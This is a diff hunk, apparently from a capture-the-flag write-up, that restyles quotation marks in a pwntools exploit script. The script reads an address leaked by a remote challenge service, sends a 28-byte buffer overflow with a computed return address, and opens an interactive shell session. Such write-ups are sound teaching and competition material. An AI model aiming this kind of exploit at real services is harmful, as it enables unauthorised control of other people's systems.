@@ -13,12 +13,12 @@ author: pakkunandy
 ```py
 from pwn import *
 
-conn = remote("61.28.237.24", 30201)
+conn = remote('61.28.237.24', 30201)
 conn.recvline()
-line = conn.recvline().decode().replace("Your current location is townsquare with the address ", "")
+line = conn.recvline().decode().replace('Your current location is townsquare with the address ', '')
 
 address = int(line, 16)
-log.info("Leaked: " + hex(address))
+log.info('Leaked: ' + hex(address))
 
 conn.sendline(b'A' * 28 + p32(0x112d6 - 0x112ff + address))
 conn.interactive()
